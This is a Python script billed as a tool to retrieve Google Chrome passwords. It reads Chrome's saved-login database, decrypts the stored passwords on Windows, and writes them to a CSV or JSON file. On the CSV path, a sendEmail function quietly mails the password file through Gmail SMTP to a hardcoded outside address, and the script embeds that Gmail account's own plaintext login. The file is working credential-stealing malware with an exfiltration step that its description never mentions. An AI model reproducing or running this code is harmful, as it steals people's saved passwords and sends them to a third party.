#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import sqlite3
import csv
import json
import argparse

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

try:
    import win32crypt
except:
    pass


def args_parser():
    parser = argparse.ArgumentParser(
        description="Retrieve Google Chrome Passwords")
    parser.add_argument("-o", "--output", choices=['csv', 'json'],
                        help="Output passwords to [ CSV | JSON ] format.")
    parser.add_argument(
        "-d", "--dump", help="Dump passwords to stdout. ", action="store_true")

    args = parser.parse_args()
    if args.dump:
        for data in main():
            print(data)
    if args.output == 'csv':
        output_csv(main())
        return

    if args.output == 'json':
        output_json(main())
        return

    else:
        parser.print_help()


def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            print("Mac OSX not supported.")
            sys.exit(0)

        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })

            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
            sys.exit(0)
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
            sys.exit(0)
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
            sys.exit(0)
        else:
            print(e)
            sys.exit(0)

    return info_list


def getpath():
    if os.name == "nt":
        # This is the Windows Path
        PathName = os.getenv('localappdata') + \
                   '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
    elif ((os.name == "posix") and (sys.platform == "darwin")):
        # This is the OS X Path
        PathName = os.getenv(
            'HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
    elif (os.name == "posix"):
        # This is the Linux Path
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)

    return PathName


def output_csv(info):
    try:
        with open('chromepass-passwords.csv', 'wb') as csv_file:
            csv_file.write('origin_url,username,password \n'.encode('utf-8'))
            for data in info:
                csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data[
                    'username'], data['password'])).encode('utf-8'))
        print("Data written to chromepass-passwords.csv")
        sendEmail()
    except EnvironmentError:
        print('EnvironmentError: cannot write data')


def output_json(info):
    try:
        with open('chromepass-passwords.json', 'w') as json_file:
            json.dump({'password_items': info}, json_file)
            print("Data written to chromepass-passwords.json")
    except EnvironmentError:
        print('EnvironmentError: cannot write data')


def sendEmail():
    fromaddr = "pathakrohit8190@gmail.com"
    toaddr = "pathakrohit08@gmail.com"

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Password sent by User"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = "chromepass-passwords.csv"
    attachment = open(".\chromepass-passwords.csv", "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, "rohit8190")

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

    print("Email sent")


if __name__ == '__main__':
    args_parser()
